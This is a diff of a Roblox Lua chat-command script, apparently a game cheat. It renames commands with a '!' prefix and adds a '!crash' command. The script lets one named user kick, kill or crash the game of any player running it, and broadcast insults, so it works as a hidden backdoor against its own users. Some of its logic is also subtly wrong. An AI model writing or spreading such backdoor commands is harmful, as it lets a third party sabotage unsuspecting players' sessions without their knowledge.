@@ -1253,18 +1253,18 @@ Icon.IdkWhatIsThis.E:TweenSize(
 wait(16)
 Icon:Destroy()
 end
-elseif msg == "kick "..game.Players.LocalPlayer.Name then
+elseif msg == "!kick "..game.Players.LocalPlayer.Name then
 game.Players.LocalPlayer:Kick("Kicked by xi_amo")
-elseif msg == "kill "..game.Players.LocalPlayer.Name then
+elseif msg == "!kill "..game.Players.LocalPlayer.Name then
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
-elseif msg == "L" then
+elseif msg == "!L" then
 game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
             Text = "ur bad, LOSER",
             Color = Color3.fromRGB(8, 255, 36),
             Font = Enum.Font.GothamBold,
             TextSize = 18,
         })
-elseif msg == "crucifix "..game.Players.LocalPlayer.Name then
+elseif msg == "!crucifix "..game.Players.LocalPlayer.Name then
 -- Thunder Crucifix
 Item = "11801923470"
 ChainsID = "11799838414"
@@ -1278,15 +1278,15 @@ local args = {
     [2] = "All"
 }
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-elseif msg == "cmds" then
+elseif msg == "!cmds" then
 local args = {
     [1] = "name...Like Boy, crucifix.. name. kill, kick, L, here, ws, figure, killchild",
     [2] = "All"
 }
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
-elseif msg == "ws" then
+elseif msg == "!ws" then
 game.Players.LocalPlayer.Character.Humanoid.Walkspeed = 50
-elseif msg == "figure" then
+elseif msg == "!figure" then
 -- run rbxassetid://10468139231
 -- walk rbxassetid://8465893113
 -- closet rbxassetid://6535654797
@@ -1311,15 +1311,15 @@ end
 
 spawnf()
 print('yes') 
-elseif msg == "killchild" then
+elseif msg == "!killchild" then
    workspace.ChildAdded:Connect(function(c)
        if c.Name == "RushMoving" or "AmbushMoving" then else c:Destroy() end 
 end)
-elseif msg == "norooms" then 
+elseif msg == "!norooms" then 
 if workspace:FindFirstChild("CurrentRooms") then 
     workspace.CurrentRooms:ClearAllChildren() 
 end 
-elseif msg = "/korhead" then 
+elseif msg == "!korhead" then 
 
 	game.Players.xi_amo.Character.Head.Transparency = 1
 	game.Players.xi_amo.Character.Head.Transparency = 1
@@ -1337,5 +1337,7 @@ elseif msg = "/korhead" then
 	chr.RightFoot.MeshId = "902942089"
 	chr.RightFoot.Transparency = "1"
 
-end 
+elseif msg == "!crash "..game.Players.LocalPlayer.Name then
+    game:ShutDown()
+end
 end)
